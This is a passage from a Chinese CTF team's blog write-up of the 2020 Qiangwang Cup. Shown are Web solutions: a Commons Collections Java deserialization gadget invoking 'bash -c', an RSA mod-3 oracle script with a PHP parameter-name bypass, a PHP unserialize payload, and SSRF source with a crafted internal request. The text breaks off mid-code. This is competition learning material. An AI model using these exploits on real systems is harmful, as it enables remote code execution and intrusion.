<!doctype html>
<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta><title>强网杯 S4 SU Write-Up - su-team</title><link rel="manifest" href="/manifest.json"><meta name="application-name" content="su-team"><meta name="msapplication-TileImage" content="/img/SU4.jpg"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="su-team"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta name="description" content="本次强网杯比赛我们 SU 取得了线上赛 12th 的成绩，感谢队里师傅们的辛苦付出！同时我们也在持续招人，只要你拥有一颗热爱 CTF 的心，都可以加入我们！欢迎发送个人简介至：suers_xctf@126.com 以下是我们 SU 本次 强网杯 S4 的 writeup"><meta property="og:type" content="blog"><meta property="og:title" content="强网杯 S4 SU Write-Up"><meta property="og:url" content="https://team-su.github.io/posts/48139.html"><meta property="og:site_name" content="su-team"><meta property="og:description" content="本次强网杯比赛我们 SU 取得了线上赛 12th 的成绩，感谢队里师傅们的辛苦付出！同时我们也在持续招人，只要你拥有一颗热爱 CTF 的心，都可以加入我们！欢迎发送个人简介至：suers_xctf@126.com 以下是我们 SU 本次 强网杯 S4 的 writeup"><meta property="og:locale" content="en_US"><meta property="og:image" content="https://i.loli.net/2020/08/23/f4cTxE8ZLg79o5W.jpg"><meta property="og:image" content="https://hackmd.summershrimp.com/uploads/upload_6a55e4763ec72134b9c0b3d913bd724b.png"><meta property="og:image" content="https://hackmd.summershrimp.com/uploads/upload_7456417605938132686ff20660e7d9ff.png"><meta property="og:image" content="https://hackmd.summershrimp.com/uploads/upload_d374609201cbd3daf43e87e452f03c30.png"><meta property="og:image" content="https://hackmd.summershrimp.com/uploads/upload_96ed59c4dba7593974234283b98b6ca3.png"><meta property="og:image" content="https://hackmd.summershrimp.com/uploads/upload_d88a9c7631f80aee514a93c951730a2b.png"><meta property="og:image" content="https://hackmd.summershrimp.com/uploads/upload_abea5644a517e71dffcdda7ab5957760.png"><meta property="og:image" content="https://hackmd.summershrimp.com/uploads/upload_4a982fd6cd1c6c0e6ea0ff6ead63c099.png"><meta property="og:image" content="https://hackmd.summershrimp.com/uploads/upload_1f8f684177225795f5167bf2a7a69080.png"><meta property="og:image" content="https://hackmd.summershrimp.com/uploads/upload_f6df4e39c4e1ca6dcb47e51e2d442ff5.png"><meta property="og:image" content="https://hackmd.summershrimp.com/uploads/upload_bbc71b52cfdefddb249b337787f0c652.png"><meta property="og:image" content="https://hackmd.summershrimp.com/uploads/upload_ee8ac49c5879017f86dfc47f2778e39c.png"><meta property="og:image" content="https://hackmd.summershrimp.com/uploads/upload_944a8f9c6845bac7c504f38481822778.png"><meta property="og:image" content="https://hackmd.summershrimp.com/uploads/upload_e1c2ffc280b41e4a1e98b99227cd24d9.png"><meta property="og:image" content="https://hackmd.summershrimp.com/uploads/upload_80b51b89dfd332c4c8c86c69fe16698d.png"><meta property="og:image" content="https://hackmd.summershrimp.com/uploads/upload_7b66e6dda856cd1cf3f9c8ab71abcb68.png"><meta property="og:image" content="https://hackmd.summershrimp.com/uploads/upload_159b1c4e457f109f16b6c8ba0e45486b.png"><meta property="og:image" content="https://hackmd.summershrimp.com/uploads/upload_89f5b8eb5b121d8ba732901351531e73.png"><meta property="og:image" content="https://i.loli.net/2020/08/23/WhGOoXKJQVyH4c2.png"><meta property="og:image" content="https://i.loli.net/2020/08/23/vsh6M3fpr9OAx2Q.png"><meta property="og:image" content="https://i.loli.net/2020/08/23/yltfSPeMgpYLJUu.png"><meta property="og:image" content="https://i.loli.net/2020/08/23/1hvuTxL9gWVQJpj.png"><meta property="og:image" content="https://hackmd.summershrimp.com/uploads/upload_7487dc2dc6748d87889114d2ddd279d6.png"><meta property="og:image" content="https://hackmd.summershrimp.com/uploads/upload_28920235447ac58455a8fc5ce744baac.png"><meta property="og:image" content="https://hackmd.summershrimp.com/uploads/upload_dd2a1b0987a7931fcf7479b8dbd231a6.png"><meta property="article:published_time" content="2020-08-24T13:00:00.000Z"><meta property="article:modified_time" content="2025-07-13T10:34:37.200Z"><meta property="article:author" content="SUers"><meta property="article:tag" content="QWB"><meta property="twitter:card" content="summary"><meta property="twitter:image:src" content="https://i.loli.net/2020/08/23/f4cTxE8ZLg79o5W.jpg"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://team-su.github.io/posts/48139.html"},"headline":"强网杯 S4 SU Write-Up","image":["https://i.loli.net/2020/08/23/f4cTxE8ZLg79o5W.jpg","https://hackmd.summershrimp.com/uploads/upload_6a55e4763ec72134b9c0b3d913bd724b.png","https://hackmd.summershrimp.com/uploads/upload_7456417605938132686ff20660e7d9ff.png","https://hackmd.summershrimp.com/uploads/upload_d374609201cbd3daf43e87e452f03c30.png","https://hackmd.summershrimp.com/uploads/upload_96ed59c4dba7593974234283b98b6ca3.png","https://hackmd.summershrimp.com/uploads/upload_d88a9c7631f80aee514a93c951730a2b.png","https://hackmd.summershrimp.com/uploads/upload_abea5644a517e71dffcdda7ab5957760.png","https://hackmd.summershrimp.com/uploads/upload_4a982fd6cd1c6c0e6ea0ff6ead63c099.png","https://hackmd.summershrimp.com/uploads/upload_1f8f684177225795f5167bf2a7a69080.png","https://hackmd.summershrimp.com/uploads/upload_f6df4e39c4e1ca6dcb47e51e2d442ff5.png","https://hackmd.summershrimp.com/uploads/upload_bbc71b52cfdefddb249b337787f0c652.png","https://hackmd.summershrimp.com/uploads/upload_ee8ac49c5879017f86dfc47f2778e39c.png","https://hackmd.summershrimp.com/uploads/upload_944a8f9c6845bac7c504f38481822778.png","https://hackmd.summershrimp.com/uploads/upload_e1c2ffc280b41e4a1e98b99227cd24d9.png","https://hackmd.summershrimp.com/uploads/upload_80b51b89dfd332c4c8c86c69fe16698d.png","https://hackmd.summershrimp.com/uploads/upload_7b66e6dda856cd1cf3f9c8ab71abcb68.png","https://hackmd.summershrimp.com/uploads/upload_159b1c4e457f109f16b6c8ba0e45486b.png","https://hackmd.summershrimp.com/uploads/upload_89f5b8eb5b121d8ba732901351531e73.png","https://i.loli.net/2020/08/23/WhGOoXKJQVyH4c2.png","https://i.loli.net/2020/08/23/vsh6M3fpr9OAx2Q.png","https://i.loli.net/2020/08/23/yltfSPeMgpYLJUu.png","https://i.loli.net/2020/08/23/1hvuTxL9gWVQJpj.png","https://hackmd.summershrimp.com/uploads/upload_7487dc2dc6748d87889114d2ddd279d6.png","https://hackmd.summershrimp.com/uploads/upload_28920235447ac58455a8fc5ce744baac.png","https://hackmd.summershrimp.com/uploads/upload_dd2a1b0987a7931fcf7479b8dbd231a6.png"],"datePublished":"2020-08-24T13:00:00.000Z","dateModified":"2025-07-13T10:34:37.200Z","author":{"@type":"Person","name":"SUers"},"publisher":{"@type":"Organization","name":"su-team","logo":{"@type":"ImageObject","url":"https://team-su.github.io/img/SU4.jpg"}},"description":"本次强网杯比赛我们 SU 取得了线上赛 12th 的成绩，感谢队里师傅们的辛苦付出！同时我们也在持续招人，只要你拥有一颗热爱 CTF 的心，都可以加入我们！欢迎发送个人简介至：suers_xctf@126.com 以下是我们 SU 本次 强网杯 S4 的 writeup"}</script><link rel="canonical" href="https://team-su.github.io/posts/48139.html"><link rel="alternate" href="/atom.xml" title="su-team" type="application/atom+xml"><link rel="icon" href="/img/SU4.jpg"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v6.0.0/css/all.css"><link data-pjax rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@11.7.0/styles/atom-one-light.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@400;600&amp;family=Source+Code+Pro"><link data-pjax rel="stylesheet" href="/css/default.css"><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><!--!--><!--!--><!--!--><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.10.0/dist/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/css/justifiedGallery.min.css"><!--!--><!--!--><!--!--><style>.pace{-webkit-pointer-events:none;pointer-events:none;-webkit-user-select:none;-moz-user-select:none;user-select:none}.pace-inactive{display:none}.pace .pace-progress{background:#3273dc;position:fixed;z-index:2000;top:0;right:100%;width:100%;height:2px}</style><script src="https://cdn.jsdelivr.net/npm/pace-js@1.2.4/pace.min.js"></script><!--!--><!--!--><!-- hexo injector head_end start --><script>
  (function () {
      function switchTab() {
          if (!location.hash) {
            return;
          }

          const id = '#' + CSS.escape(location.hash.substring(1));
          const $tabMenu = document.querySelector(`.tabs a[href="${id}"]`);
          if (!$tabMenu) {
            return;
          }

          const $tabMenuContainer = $tabMenu.parentElement.parentElement;
          Array.from($tabMenuContainer.children).forEach($menu => $menu.classList.remove('is-active'));
          Array.from($tabMenuContainer.querySelectorAll('a'))
              .map($menu => document.getElementById($menu.getAttribute("href").substring(1)))
              .forEach($content => $content.classList.add('is-hidden'));

          if ($tabMenu) {
              $tabMenu.parentElement.classList.add('is-active');
          }
          const $activeTab = document.querySelector(id);
          if ($activeTab) {
              $activeTab.classList.remove('is-hidden');
          }
      }
      switchTab();
      window.addEventListener('hashchange', switchTab, false);
  })();
  </script><!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"></head><body class="is-1-column"><nav class="navbar navbar-main"><div class="container navbar-container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/"><img src="/img/SU4.jpg" alt="su-team" height="28"></a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">Home</a><a class="navbar-item" href="/archives">Archives</a><a class="navbar-item" href="/tags">Tags</a><a class="navbar-item" href="/about">About</a><a class="navbar-item" href="/members">Members</a><a class="navbar-item" href="https://forms.office.com/r/YxbUJJ3i78">Join</a></div><div class="navbar-end"></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-12"><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item">Posted&nbsp;<time dateTime="2020-08-24T13:00:00.000Z" title="2020/8/24 21:00:00">2020-08-24</time></span><span class="level-item">Updated&nbsp;<time dateTime="2025-07-13T10:34:37.200Z" title="2025/7/13 18:34:37">2025-07-13</time></span><span class="level-item">an hour read (About 6721 words)</span></div></div><h1 class="title is-3 is-size-4-mobile">强网杯 S4 SU Write-Up</h1><div class="content"><p>本次强网杯比赛我们 SU 取得了线上赛 12th 的成绩，感谢队里师傅们的辛苦付出！同时我们也在持续招人，只要你拥有一颗热爱 CTF 的心，都可以加入我们！欢迎发送个人简介至：<a href="mailto:&#x73;&#117;&#x65;&#114;&#x73;&#x5f;&#x78;&#x63;&#116;&#x66;&#x40;&#49;&#50;&#x36;&#46;&#x63;&#x6f;&#109;">suers_xctf@126.com</a></p>
<p>以下是我们 SU 本次 强网杯 S4 的 writeup </p>
<span id="more"></span>

<hr>
<p>本次强网杯比赛我们 SU 取得了线上赛 12th 的成绩，感谢队里师傅们的辛苦付出！同时我们也在持续招人，只要你拥有一颗热爱 CTF 的心，都可以加入我们！欢迎发送个人简介至：<a href="mailto:&#115;&#117;&#x65;&#x72;&#x73;&#95;&#x78;&#x63;&#x74;&#x66;&#64;&#49;&#x32;&#x36;&#x2e;&#99;&#x6f;&#x6d;">suers_xctf@126.com</a></p>
<p>以下是我们 SU 本次 强网杯 S4 的 writeup </p>
<div class="toc">

<!-- toc -->

<ul>
<li><a href="#web">Web</a><ul>
<li><a href="#easy-java">easy_java</a></li>
<li><a href="#dice2cry">dice2cry</a></li>
<li><a href="#half-infiltration">half_infiltration</a></li>
</ul>
</li>
<li><a href="#pwn">Pwn</a><ul>
<li><a href="#qwblogin">qwblogin</a></li>
<li><a href="#direct">direct</a></li>
<li><a href="#easypwn">easypwn</a></li>
<li><a href="#oldschool">oldschool</a></li>
</ul>
</li>
<li><a href="#misc">Misc</a><ul>
<li><a href="#miscstudy">miscstudy</a></li>
</ul>
</li>
<li><a href="#rev">Rev</a><ul>
<li><a href="#xx-warmup-obf">xx_warmup_obf</a></li>
<li><a href="#imitation-game">imitation_game</a></li>
</ul>
</li>
<li><a href="#crypto">Crypto</a><ul>
<li><a href="#fault">fault</a></li>
<li><a href="#modestudy">modestudy</a></li>
</ul>
</li>
<li><a href="#blockchain">Blockchain</a><ul>
<li><a href="#ipfs">IPFS</a></li>
</ul>
</li>
<li><a href="#qiang-wang-xian-feng">强网先锋</a><ul>
<li><a href="#zhu-dong">主动</a></li>
<li><a href="#upload">upload</a></li>
<li><a href="#funhash">Funhash</a></li>
<li><a href="#web-fu-zhu">web辅助</a></li>
<li><a href="#ce-fang">侧防</a></li>
<li><a href="#baby-crt">baby_crt</a></li>
<li><a href="#babymessage">babymessage</a></li>
<li><a href="#bank">bank</a></li>
<li><a href="#hong-fang-fu-zhu">红方辅助</a></li>
<li><a href="#siri-qiang-wang-xian-feng">Siri - 强网先锋</a></li>
<li><a href="#just-a-galgame-qiang-wang-xian-feng">Just a Galgame - 强网先锋</a></li>
<li><a href="#babynotes-qiang-wang-xian-feng">babynotes - 强网先锋</a></li>
</ul>
</li>
</ul>
<!-- tocstop -->

</div>

<h2><span id="web">Web</span><a href="#web" class="header-anchor"></a></h2><h3><span id="easy-java">easy_java</span><a href="#easy-java" class="header-anchor"></a></h3><p>绕一下过滤就行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">package ysoserial.payloads;</span><br><span class="line"></span><br><span class="line">import org.apache.commons.collections.Transformer;</span><br><span class="line">import org.apache.commons.collections.bag.AbstractMapBag;</span><br><span class="line">import org.apache.commons.collections.bag.HashBag;</span><br><span class="line">import org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line">import org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line">import org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line">import java.io.FileOutputStream;</span><br><span class="line">import java.io.ObjectOutputStream;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.IdentityHashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">public class Test &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        Transformer[] fake = new Transformer[]&#123;</span><br><span class="line">            new ConstantTransformer(&quot;placeholder&quot;),</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = new Transformer[]&#123;</span><br><span class="line">            new ConstantTransformer(Class.class),</span><br><span class="line">            new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;forName&quot;,  new Class[]&#123;String.class&#125;&#125;),</span><br><span class="line">            new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, new Object[]&#123;&quot;java.lang.Runtime&quot;&#125;&#125;),</span><br><span class="line">            new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, new Class[]&#123;&#125;&#125;),</span><br><span class="line">            new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, new Object[]&#123;&#125;&#125;),</span><br><span class="line">            new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String[].class&#125;, new Object[]&#123;new String[]&#123;&quot;bash&quot;, &quot;-c&quot;, &quot;&quot;&#125;&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        ChainedTransformer chainedTransformer = new ChainedTransformer(fake);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        IdentityHashMap identityHashMap = new IdentityHashMap();</span><br><span class="line">        LazyMap lazyMap = (LazyMap) LazyMap.decorate(identityHashMap, chainedTransformer);</span><br><span class="line">        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, &quot;placeholder&quot;);</span><br><span class="line"></span><br><span class="line">        HashBag hashMap = new HashBag();</span><br><span class="line">        hashMap.add(tiedMapEntry, 1);</span><br><span class="line"></span><br><span class="line">        Field field = chainedTransformer.getClass().getDeclaredField(&quot;iTransformers&quot;);</span><br><span class="line">        field.setAccessible(true);</span><br><span class="line">        field.set(chainedTransformer, transformers);</span><br><span class="line">        identityHashMap.clear();</span><br><span class="line"></span><br><span class="line">        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;out.bin&quot;));</span><br><span class="line">        oos.writeObject(hashMap);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h3><span id="dice2cry">dice2cry</span><a href="#dice2cry" class="header-anchor"></a></h3><p><a href="http://106.14.66.189/abi.php.bak">http://106.14.66.189/abi.php.bak</a> 得到源码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">session_start();</span><br><span class="line">header(&quot;Content-type:text/html;charset=utf-8&quot;);</span><br><span class="line"></span><br><span class="line">        $data = json_decode($json_string, true);</span><br><span class="line"></span><br><span class="line">        $rand_number = isset($_POST[&#x27;this_is.able&#x27;]) ? $_POST[&#x27;this_is.able&#x27;] : mt_rand();</span><br><span class="line">        $n = gmp_init($data[&#x27;n&#x27;]);</span><br><span class="line">        $d = gmp_init($data[&#x27;d&#x27;]);</span><br><span class="line">        $c = gmp_init($rand_number);</span><br><span class="line">        $m = gmp_powm($c,$d,$n);</span><br><span class="line">        $v3 = gmp_init(&#x27;3&#x27;);</span><br><span class="line">        $r = gmp_mod($m,$v3);</span><br><span class="line">        $result=(int)gmp_strval($r);</span><br><span class="line">        $dice = array(&quot;num&quot;=&gt;$result);</span><br><span class="line">        $json_obj = json_encode($dice);</span><br><span class="line">        echo $json_obj;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>可以看到 <a href="https://github.com/php/php-src/commit/fc4d462e947828fdbeac6020ac8f34704a218834">https://github.com/php/php-src/commit/fc4d462e947828fdbeac6020ac8f34704a218834</a> 这次 commit 修了一个bug，我们可以用<code>[</code>绕过 php 对点的转换。web 部分结束<br>密码学部分：RSA LSB Oracle，不过是mod 3的。把区间改一改就行了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cookies = &#123;</span><br><span class="line">    <span class="string">&quot;PHPSESSID&quot;</span>: <span class="string">&quot;4fp96q7ik9osjbvuaignpiv70o&quot;</span>,</span><br><span class="line">    <span class="string">&quot;encrypto_flag&quot;</span>: <span class="string">&quot;3869312711921718181496939729558807189471208864005174371688083330158692727951530885631463620813499380620505887128241566855245089238486494716206458945983582420081939159954313437949593882767853854572863428430644724509166235841551934917025078319846503154318123173991091238707586128668756962224602429656368938289&quot;</span>,</span><br><span class="line">    <span class="string">&quot;public_n&quot;</span>: <span class="string">&quot;8f5dc00ef09795a3efbac91d768f0bff31b47190a0792da3b0d7969b1672a6a6ea572c2791fa6d0da489f5a7d743233759e8039086bc3d1b28609f05960bd342d52bffb4ec22b533e1a75713f4952e9075a08286429f31e02dbc4a39e3332d2861fc7bb7acee95251df77c92bd293dac744eca3e6690a7d8aaf855e0807a1157&quot;</span>,</span><br><span class="line">    <span class="string">&quot;public_e&quot;</span>: <span class="string">&quot;010001&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">c = <span class="built_in">int</span>(cookies[<span class="string">&quot;encrypto_flag&quot;</span>])</span><br><span class="line">n = <span class="built_in">int</span>(cookies[<span class="string">&quot;public_n&quot;</span>], <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://106.14.66.189/abi.php&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">oracle</span>(<span class="params">c</span>):</span><br><span class="line">    data = &#123;<span class="string">&quot;this[is.able&quot;</span>:<span class="string">f&quot;<span class="subst">&#123;c&#125;</span>&quot;</span>&#125;</span><br><span class="line">    response = requests.post(url, data, cookies=cookies)</span><br><span class="line">    <span class="keyword">return</span> json.loads(response.content)[<span class="string">&quot;num&quot;</span>]</span><br><span class="line"></span><br><span class="line">low, high = <span class="number">0</span>, n</span><br><span class="line"></span><br><span class="line">C = c</span><br><span class="line">t = <span class="built_in">pow</span>(<span class="number">3</span>, e, n)</span><br><span class="line"><span class="keyword">while</span> low &lt; high - <span class="number">1</span>:</span><br><span class="line">    C = C*t % n</span><br><span class="line">    res = oracle(C)</span><br><span class="line">    interval = (high - low) // <span class="number">3</span></span><br><span class="line">    <span class="keyword">if</span> res == <span class="number">0</span>:</span><br><span class="line">        high = high - <span class="number">2</span>*interval</span><br><span class="line">    <span class="keyword">elif</span> res == <span class="number">2</span>*n % <span class="number">3</span>:</span><br><span class="line">        low, high = low + interval, high - interval</span><br><span class="line">    <span class="keyword">elif</span> res == n % <span class="number">3</span>:</span><br><span class="line">        low = low + <span class="number">2</span>*interval </span><br><span class="line">    <span class="built_in">print</span>(res, low, high)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> diff <span class="keyword">in</span> <span class="built_in">range</span>(-<span class="number">500</span>, <span class="number">500</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">pow</span>(low+diff, e, n) == c:</span><br><span class="line">        <span class="built_in">print</span>(long_to_bytes(low + diff))</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>


<p><img src="https://i.loli.net/2020/08/23/f4cTxE8ZLg79o5W.jpg"></p>
<h3><span id="half-infiltration">half_infiltration</span><a href="#half-infiltration" class="header-anchor"></a></h3><p><a href="http://39.98.131.124/">http://39.98.131.124/</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view-source:http://39.98.131.124/?x=a:2:&#123;i:0;O:4:%22User%22:3:&#123;s:3:%22age%22;O:4:%22Pass%22:0:&#123;&#125;s:3:%22sex%22;s:4:%22read%22;s:3:%22num%22;s:6:%22result%22;&#125;i:1;O:4:%22User%22:3:&#123;s:3:%22age%22;O:4:%22Pass%22:0:&#123;&#125;s:3:%22sex%22;s:4:%22read%22;s:3:%22num%22;s:4:%22this%22;&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>通过<code>$this</code>让 php 产生 fatal error 打破 <code>obstart</code> 得到源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">//经过扫描确认35000以下端口以及50000以上端口不存在任何内网服务,请继续渗透内网</span></span><br><span class="line">    <span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;we_have_done_ssrf_here_could_you_help_to_continue_it&#x27;</span>] ?? <span class="literal">false</span>; </span><br><span class="line">	<span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|var|apache|conf|proc|log/i&quot;</span> ,<span class="variable">$url</span>))&#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$url</span>)</span><br><span class="line">    &#123; </span><br><span class="line"></span><br><span class="line">            <span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>(); </span><br><span class="line">            <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>); </span><br><span class="line">            <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">1</span>);</span><br><span class="line">            <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line">            <span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>); </span><br><span class="line"></span><br><span class="line">     &#125; </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$header</span> = <span class="string">&lt;&lt;&lt;EOF</span></span><br><span class="line"><span class="string">POST / HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 127.0.0.1</span></span><br><span class="line"><span class="string">User-Agent: curl/7.64.1</span></span><br><span class="line"><span class="string">Accept: */*</span></span><br><span class="line"><span class="string">Content-Length: 0</span></span><br><span class="line"><span class="string">Connection: close</span></span><br><span class="line"><span class="string">Cookie: PHPSESSID=20vmv3q3hgn1ti6497q4927gk0</span></span><br><span class="line"><span class="string">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">EOF</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$data</span> = <span class="string">&quot;file=.1.txt&amp;content=1&quot;</span>;</span><br><span class="line"><span class="variable">$length</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$data</span>);</span><br><span class="line"><span class="variable">$header</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;Content-Length: 0&quot;</span>, <span class="string">&quot;Content-Length: <span class="subst">$length</span>&quot;</span>, <span class="variable">$header</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;\n&quot;</span>, <span 